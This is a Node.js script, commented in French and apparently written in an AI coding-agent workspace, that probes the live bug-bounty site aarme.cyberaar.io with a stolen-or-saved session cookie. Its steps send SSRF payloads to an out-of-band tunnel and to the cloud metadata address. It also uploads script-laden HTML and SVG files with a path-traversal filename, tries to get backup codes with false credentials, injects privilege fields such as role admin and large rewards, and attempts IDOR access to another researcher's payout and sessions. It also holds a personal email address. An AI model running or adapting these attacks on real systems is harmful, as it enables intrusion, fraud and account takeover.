// CYBERAAR : suite authentifiee (session de test) — par etapes pour respecter les plafonds
// Usage : node auth-suite.mjs <etape>
//   1 = etat du compte (me, sessions, collaborations, sanctions, research-header)
//   2 = SSRF : le serveur fetch-t-il les URL du profil ? (website / avatarUrl) -> preuve OOB
//   3 = upload : le serveur filtre-t-il le type ? (avatar + attachment) + nom de fichier
//   4 = codes de secours : exigent-ils le mot de passe courant + TOTP ?
//   5 = mass assignment sur la soumission de rapport + cible hors perimetre
//   6 = IDOR : les endpoints de l autre chercheur (payout, sessions, collaborations)
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const TUN = fs.existsSync("/tmp/opencode/cyberaar/tunnel-url.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/tunnel-url.txt", "utf8").trim() : "";
const COOKIE = fs.existsSync("/tmp/opencode/cyberaar/session-cookie.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/session-cookie.txt", "utf8").trim() : "";
const step = process.argv[2] || "1";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const H = (extra = {}) => ({ "Content-Type": "application/json", Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE, ...extra });
async function req(path, o = {}) {
  for (let i = 0; i < 3; i++) {
    try {
      const t0 = Date.now();
      const init = { method: o.m || "GET", headers: o.raw ? H(o.h || {}) : { Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE, ...(o.h || {}) }, redirect: "manual", signal: AbortSignal.timeout(25000) };
      if (o.body) init.body = o.body;
      const r = await fetch(APP + path, init);
      const t = await r.text();
      return { s: r.status, ms: Date.now() - t0, txt: t, h: Object.fromEntries(r.headers) };
    } catch (e) { await sleep(2500); }
  }
  return { s: 0, ms: 0, txt: "ERR" };
}
const show = (l, r) => console.log("  " + l.padEnd(46) + "HTTP " + r.s + " " + String(r.ms).padStart(5) + "ms  " + (r.txt || "").replace(/\s+/g, " ").slice(0, 300));

if (!COOKIE) { console.log("  !! pas de cookie de session -> lance d'abord : node mfa-login.mjs <code>"); process.exit(1); }
console.log("=== etape " + step + " (tunnel OOB : " + (TUN || "absent") + ") ===\n");

if (step === "1") {
  show("GET /account/me", await req("/api/aarme/account/me"));
  await sleep(1200);
  show("GET /account/sessions", await req("/api/aarme/account/sessions"));
  await sleep(1200);
  show("GET /account/collaborations", await req("/api/aarme/account/collaborations"));
  await sleep(1200);
  show("GET /account/sanctions", await req("/api/aarme/account/sanctions"));
  await sleep(1200);
  show("GET /account/research-header", await req("/api/aarme/account/research-header"));
  await sleep(1200);
  show("POST /account/report/payout", await req("/api/aarme/account/report/payout", { m: "POST", raw: true, body: JSON.stringify({}) }));
}

if (step === "2") {
  console.log("-- SSRF : le serveur recupere-t-il les URL fournies ? --");
  show("PATCH profile {website: TUN/ssrf-website}", await req("/api/aarme/account/profile", { m: "PATCH", raw: true, body: JSON.stringify({ website: TUN + "/ssrf-website" }) }));
  await sleep(2500);
  show("PATCH profile {avatarUrl: TUN/ssrf-avatar}", await req("/api/aarme/account/profile", { m: "PATCH", raw: true, body: JSON.stringify({ avatarUrl: TUN + "/ssrf-avatar" }) }));
  await sleep(2500);
  show("PATCH profile {website: http://admin.aarme.cyberaar.io/}", await req("/api/aarme/account/profile", { m: "PATCH", raw: true, body: JSON.stringify({ website: "http://admin.aarme.cyberaar.io/" }) }));
  await sleep(2500);
  show("PATCH profile {avatarUrl: http://169.254.169.254/}", await req("/api/aarme/account/profile", { m: "PATCH", raw: true, body: JSON.stringify({ avatarUrl: "http://169.254.169.254/" }) }));
  await sleep(2500);
  console.log("\n  --- preuve OOB : mon serveur a-t-il recu des requetes ? ---");
  try { console.log(fs.readFileSync("/tmp/opencode/cyberaar/probe-listener.log", "utf8").trim().split("\n").slice(-8).join("\n")); } catch { console.log("  (aucune requete recue)"); }
}

if (step === "3") {
  console.log("-- upload : le serveur filtre-t-il le type et le nom de fichier ? --");
  async function up(path, label, filename, type, content) {
    const fd = new FormData();
    fd.append("file", new Blob([content], { type }), filename);
    const r = await req(path, { m: "POST", raw: true, body: fd });
    show(label, r);
    return r;
  }
  const PDF = Buffer.from("%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n", "latin1");
  await up("/api/aarme/account/avatar", "avatar : PDF (controle)", "a.pdf", "application/pdf", PDF);
  await sleep(2000);
  await up("/api/aarme/account/avatar", "avatar : HTML type text/html", "a.html", "text/html", Buffer.from("<html><body><script>alert(1)</script>PING</body></html>"));
  await sleep(2000);
  await up("/api/aarme/account/avatar", "avatar : SVG", "a.svg", "image/svg+xml", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'));
  await sleep(2000);
  await up("/api/aarme/attachment", "attachment : HTML deguise .pdf", "r.pdf", "application/pdf", Buffer.from("<html><body><script>alert(1)</script>PING</body></html>"));
  await sleep(2000);
  await up("/api/aarme/attachment", "attachment : nom en traversee", "../../../../tmp/evil.pdf", "application/pdf", PDF);
}

if (step === "4") {
  console.log("-- codes de secours : exigent-ils le mot de passe courant + TOTP ? --");
  show("POST /totp/backup-codes {current: faux, totp: faux}", await req("/api/aarme/account/totp/backup-codes", { m: "POST", raw: true, body: JSON.stringify({ current: "faux-mot-de-passe", totp: "000000" }) }));
  await sleep(2000);
  show("POST /totp/backup-codes {}", await req("/api/aarme/account/totp/backup-codes", { m: "POST", raw: true, body: JSON.stringify({}) }));
  await sleep(2000);
  show("POST /totp/enrol {current: faux, totp: faux}", await req("/api/aarme/account/totp/enrol", { m: "POST", raw: true, body: JSON.stringify({ current: "faux", totp: "000000" }) }));
}

if (step === "5") {
  console.log("-- soumission de rapport : mass assignment + cible hors perimetre --");
  const base = { name: "bb-probe", email: "kandjininio@gmail.com", target: "aarme.cyberaar.io", asset: "aarme", category: "web", title: "bb-probe titre", description: "bb-probe description detaillee", steps: "bb-probe etapes de reproduction", impact: "bb-probe impact", severity: "Moyenne", proof: "bb-probe preuve", attachment_ref: "", collaborators: "" };
  show("POST /report (nominal, sans piece jointe)", await req("/api/aarme/report", { m: "POST", raw: true, body: JSON.stringify(base) }));
  await sleep(2000);
  show("POST /report + champs de privilege", await req("/api/aarme/report", { m: "POST", raw: true, body: JSON.stringify({ ...base, severity: "Critique", status: "accepted", reward: 500000, amount: 300000, kycStatus: "APPROVED", role: "admin", triaged: true }) }));
  await sleep(2000);
  show("POST /report + cible hors perimetre", await req("/api/aarme/report", { m: "POST", raw: true, body: JSON.stringify({ ...base, target: "google.com", asset: "inconnu" }) }));
}

if (step === "6") {
  console.log("-- IDOR : tenter d atteindre les ressources d un autre chercheur --");
  const other = { id: "e3aa51e2-2c87-4b64-a3cb-6d5eb857f40c" };
  show("POST /report/payout {researcherId: autre}", await req("/api/aarme/account/report/payout", { m: "POST", raw: true, body: JSON.stringify({ researcherId: other.id }) }));
  await sleep(2000);
  show("POST /report/payout {userId: autre}", await req("/api/aarme/account/report/payout", { m: "POST", raw: true, body: JSON.stringify({ userId: other.id }) }));
  await sleep(2000);
  show("GET /account/sessions?userId=autre", await req("/api/aarme/account/sessions?userId=" + other.id));
  await sleep(2000);
  show("GET /account/collaborations?userId=autre", await req("/api/aarme/account/collaborations?userId=" + other.id));
  await sleep(2000);
  show("GET /account/sanctions?userId=autre", await req("/api/aarme/account/sanctions?userId=" + other.id));
}
